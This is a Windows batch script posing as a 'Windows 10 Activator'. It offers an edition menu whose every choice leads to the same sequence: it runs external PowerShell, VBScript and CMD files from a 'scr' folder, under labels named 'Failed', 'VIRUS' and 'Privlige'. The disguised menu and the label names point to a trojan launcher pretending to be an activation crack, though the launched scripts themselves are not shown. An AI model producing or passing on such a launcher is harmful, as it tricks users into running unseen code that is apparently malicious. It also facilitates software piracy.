@echo off
color 0a
title Activator Number: %random%%random%%random%
cd C:\User\%username%\Desktop\Activation

echo.
echo.
echo.
echo.
echo.
echo.
echo -------------------------------------------Please choose a Windows 10 Edition-------------------------------------------
echo.
echo --- 1) Windows 10 Home
echo --- 2) Windows 10 Pro
echo --- 3) Windows 10 Education
echo --- 4) Windows 10 Enterprise
echo.

set/p answer=Enter your windows edition here:
if %answer%==1 goto activate
if %answer%==2 goto activate
if %answer%==3 goto activate
if %answer%==4 goto activate

:activate
cd scr
powershell .\locat.ps1
goto Failed

:Failed
cd scr
powershell .\Microsoft.Key.Finder.ps1
goto VIRUS

:VIRUS
cd scr
actv_key1073.vbs
goto Privlige

:Privlige
cd scr
LocalFiles.cmd